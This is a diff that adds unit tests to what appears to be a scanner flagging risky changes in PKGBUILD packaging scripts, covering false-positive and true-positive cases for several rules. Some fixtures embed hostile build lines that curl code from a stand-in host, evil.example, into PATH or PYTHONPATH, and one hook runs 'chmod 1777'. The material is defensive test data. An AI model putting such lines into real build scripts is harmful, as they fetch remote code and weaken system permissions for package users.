@@ -856,3 +856,122 @@ def test_h023_still_fires_when_a_named_hook_is_present():
             " install=demo.install\n")
     assert "H023" in _ids(
         diff, current_text="pkgname=demo\npkgver=2\ninstall=demo.install\n")
+
+
+# --- 2026-10-23 alert review: reproducible malicious false positives --------
+
+def _findings(diff, current_text=None, package="demo"):
+    with shipped_config():
+        fact = scan_diff(diff, rules=load_rules(), config=load_config(),
+                         package_name=package, current_text=current_text)
+    return fact.score_breakdown
+
+
+def test_x024_does_not_read_a_printed_install_notice_as_an_assignment():
+    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,3 @@\n"
+            " pkgname=demo\n"
+            "+install=demo.install\n"
+            "--- /dev/null\n+++ b/demo.install\n@@ -0,0 +1,2 @@\n"
+            "+post_install() {\n"
+            "+  echo '  export PATH=\"$(aqua root-dir)/bin:$PATH\"'\n"
+            "+}\n")
+    assert "X024" not in _ids(diff)
+
+
+def test_x024_still_fires_on_a_real_indirect_path_assignment():
+    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,3 @@\n"
+            " pkgname=demo\n+build() {\n"
+            "+  PATH=\"$(curl https://evil.example/tool)\" make\n+}\n")
+    assert "X024" in _ids(diff)
+
+
+def test_x014_and_x024_do_not_fire_on_a_check_test_runner_environment():
+    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,3 @@\n"
+            " pkgname=demo\n+check() {\n"
+            '+  PYTHONPATH="$staged" python -P "$srcdir/test.py"\n+}\n')
+    ids = _ids(diff)
+    assert "X014" not in ids
+    assert "X024" not in ids
+
+
+def test_x024_still_fires_on_a_command_substitution_in_check():
+    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,3 @@\n"
+            " pkgname=demo\n+check() {\n"
+            '+  PYTHONPATH="$(curl https://evil.example/x)" pytest\n+}\n')
+    assert "X024" in _ids(diff)
+
+
+def test_maintainer_identity_ignores_a_display_name_change():
+    from trustsight.analysis.maintainer import maintainer_identity
+
+    assert maintainer_identity("Aleksandar <a@example.test>") == \
+        maintainer_identity("Aleksandar Zarić <a@example.test>")
+    assert maintainer_identity("A <a@example.test>") != \
+        maintainer_identity("B <b@example.test>")
+
+
+def test_h100_notice_only_hook_is_info_and_does_not_score():
+    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,3 @@\n"
+            " pkgname=demo\n+install=demo.install\n pkgver=1\n"
+            "--- /dev/null\n+++ b/demo.install\n@@ -0,0 +1,7 @@\n"
+            "+_notice() {\n+  cat <<'EOF'\n+hello\n+EOF\n+}\n"
+            "+post_install() { _notice; }\n")
+    rows = [e for e in _findings(diff) if e.rule_id == "H100"]
+    assert rows and rows[0].severity == "INFO" and rows[0].weight == 0
+
+
+def test_h100_still_high_when_the_hook_changes_permissions():
+    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,3 @@\n"
+            " pkgname=demo\n+install=demo.install\n pkgver=1\n"
+            "--- /dev/null\n+++ b/demo.install\n@@ -0,0 +1,3 @@\n"
+            "+post_install() {\n+  chmod 1777 /opt/demo/out\n+}\n")
+    rows = [e for e in _findings(diff) if e.rule_id == "H100"]
+    assert rows and rows[0].severity == "HIGH"
+
+
+def test_c021_does_not_fire_when_the_transitional_package_drops_the_build():
+    new = "pkgname=demo\npkgver=1\ndepends=('demo-new')\n"
+    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,4 +1,3 @@\n"
+            " pkgname=demo\n pkgver=1\n"
+            "-build() { make; }\n-optdepends=('foo: x')\n"
+            "+depends=('demo-new')\n")
+    assert "C021" not in _ids(diff, current_text=new)
+
+
+def test_c021_does_not_fire_when_a_dependency_moves_between_arrays():
+    new = ("pkgname=demo\npkgver=1\nbuild() { make all; }\n"
+           "checkdepends=('foo')\n")
+    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,4 +1,4 @@\n"
+            " pkgname=demo\n pkgver=1\n"
+            "-build() { make; }\n-optdepends=('foo: x')\n"
+            "+build() { make all; }\n+checkdepends=('foo')\n")
+    assert "C021" not in _ids(diff, current_text=new)
+
+
+def test_c021_still_fires_when_a_dependency_is_really_removed():
+    new = "pkgname=demo\npkgver=1\nbuild() { make all; }\n"
+    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,4 +1,3 @@\n"
+            " pkgname=demo\n pkgver=1\n"
+            "-build() { make; }\n-optdepends=('foo: x')\n"
+            "+build() { make all; }\n")
+    assert "C021" in _ids(diff, current_text=new)
+
+
+def test_c021_quiet_on_removing_a_coverage_plugin_only():
+    new = ("pkgname=demo\npkgver=1\nbuild() { make all; }\n"
+           "checkdepends=('python-pytest')\n")
+    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,4 +1,4 @@\n"
+            " pkgname=demo\n pkgver=1\n"
+            "-build() { make; }\n-checkdepends=('python-pytest' 'python-pytest-cov')\n"
+            "+build() { make all; }\n+checkdepends=('python-pytest')\n")
+    assert "C021" not in _ids(diff, current_text=new)
+
+
+def test_c021_still_fires_when_the_test_runner_is_removed():
+    new = ("pkgname=demo\npkgver=1\nbuild() { make all; }\n"
+           "checkdepends=('python-pytest-cov')\n")
+    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,4 +1,4 @@\n"
+            " pkgname=demo\n pkgver=1\n"
+            "-build() { make; }\n-checkdepends=('python-pytest' 'python-pytest-cov')\n"
+            "+build() { make all; }\n+checkdepends=('python-pytest-cov')\n")
+    assert "C021" in _ids(diff, current_text=new)
